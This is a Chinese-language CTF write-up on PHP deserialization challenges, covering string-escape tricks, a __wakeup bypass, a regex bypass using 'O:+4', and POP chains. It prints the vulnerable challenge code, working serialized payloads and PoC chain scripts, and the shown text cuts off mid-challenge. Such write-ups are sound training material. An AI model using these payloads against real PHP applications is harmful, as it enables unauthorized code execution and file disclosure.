<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;escaping&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;N;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span></span><br></pre></td></tr></table></div></figure>

<p>O:4:”test”:2:{s:4:”user”;N;<strong>s:4:”pass”;s:8:”escaping”;}</strong>“;</p>
<p>O:4:”test”:2:{s:4:”user”;s:3:”php”;<strong>s:4:”pass”;s:8:”escaping”;}</strong>“;</p>
<p>O:4:”test”:2:{s:4:”user”;s:3:”php**”;s:4:”pass”;s:8:”escaping”;}**”;</p>
<p>O:4:”test”:2:{s:4:”user”;s:116:”phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp”;s:4:”pass”;s:8:”escaping”;}”;</p>
<p>O:4:”test”:2:{s:4:”user”;s:116:”hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack**”;s:4:”pass”;s:8:”escaping”;}**”;</p>
<p>提交phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp”;s:4:”pass”;s:8:”escaping”;}得到flag</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;</span><br></pre></td></tr></table></div></figure>

<p>字符串减少</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hk&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span> ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>,<span class="variable">$pass</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>=<span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&quot;qlnu&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:4:&quot;flag&quot;;s:4:&quot;pass&quot;;s:4:&quot;qlnu&quot;;s:3:&quot;vip&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></div></figure>


<p>O:4:”test”:3:{s:4:”user”;s:4:”flag”;s:4:”pass”;s:4:”qlnu”;s:3:”vip”;b:1;} </p>
<p>思路：这道题目中flag会被替换成hk，会造成字符串减少，就会往后吃，我们要知道往后吃多少个，在这段代码里VIP的值不可以动，我们可以通过修改qlnu的值来利用字符串逃逸     目标代码”;s:4:”pass”;s:4:”</p>
<p>这里就会造成成员属性少一个， 那么我们最终的逃逸代码要是”;s:4:”pass”;s:4:”qlnu”;s:3:”vip”;b:1;}，保证成员属性不会少</p>
<p>来判断要吃的字符串</p>
<p>“;s:4:”pass”;s:4:”     19位</p>
<p>flag到hk，吃一次少2个，最少要吃10次，少一位，后面补一下就好了<strong>a”;s:4:”pass”;s:4:”qlnu”;s:3:”vip”;b:1;}</strong></p>
<p>传参就是让user的值为flagflagflagflagflagflagflagflagflagflag</p>
<p>pass的值就是a”;s:4:”pass”;s:4:”qlnu”;s:3:”vip”;b:1;}</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="php反序列化题目">
          <a href="#php反序列化题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#php反序列化题目" class="headerlink" title="php反序列化题目"></a>php反序列化题目</h2>
      
        <h3 id="unserialize3">
          <a href="#unserialize3" class="heading-link"><i class="fas fa-link"></i></a><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></div></figure>

<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>)   ;</span><br><span class="line"><span class="comment">//code=O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span></span><br></pre></td></tr></table></div></figure>

<p>__wake up绕过</p>
<p>在传入的序列化字符串在反序列化对象时与真实存在的参数个数不同时会跳过执行，即当前函数中只有一个参数$flag，若传入的序列化字符串中的参数个数为2即可绕过。</p>
<p>?code&#x3D;O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>

        <h3 id="Web-php-unserialize">
          <a href="#Web-php-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>首先是正则绕过：&#x2F;[oc]:\d+:&#x2F;i<br>这段正则的意思是匹配所有的以o、c、O、C开头，加冒号:，加数字、再加冒号:的字符串，忽略大小写，也就是o:4:这部分序列化串开头的匹配。这里使用+4绕过，这是因为这样即绕过了这里正则的条件，由不会改变o后面的值，因为+4与4是相同的，不会影响反序列化的结果。<br>其次是wakeup，wakeup只需要把序列化字串的对象属性个数1改为别的数字就行了，但是注意这里file 的类型是private，所以打印出来的串是有不可见字符%00的，不要复制出来自己base，不然结果就不一样了。&lt;?php</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;<span class="comment">//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;%00Demo file%00&quot;;s:8:&quot;fl4g.php&quot;;&#125;  file私有变量记得加%00</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:4&quot;</span>,<span class="string">&quot;O:+4&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:1:&quot;</span>,<span class="string">&quot;:2:&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span></span><br></pre></td></tr></table></div></figure>

<p>###[NISACTF 2022]popchains</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>这个题目有一个文件包含读取flag，先捋一下触发顺序</p>
<p>倒着来的：append-&gt;invoke-&gt;get-&gt;tostring-&gt;construct</p>
<p>poc链就是</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;page=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">string</span> = <span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">string</span> -&gt; effort = <span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></div></figure>


        <h3 id="SWPUCTF-2022-新生赛-ez-1zpop">
          <a href="#SWPUCTF-2022-新生赛-ez-1zpop" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2022-新生赛-ez-1zpop" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_1zpop"></a>[SWPUCTF 2022 新生赛]ez_1zpop</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;weclome&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to NSS&#x27;</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">      <span 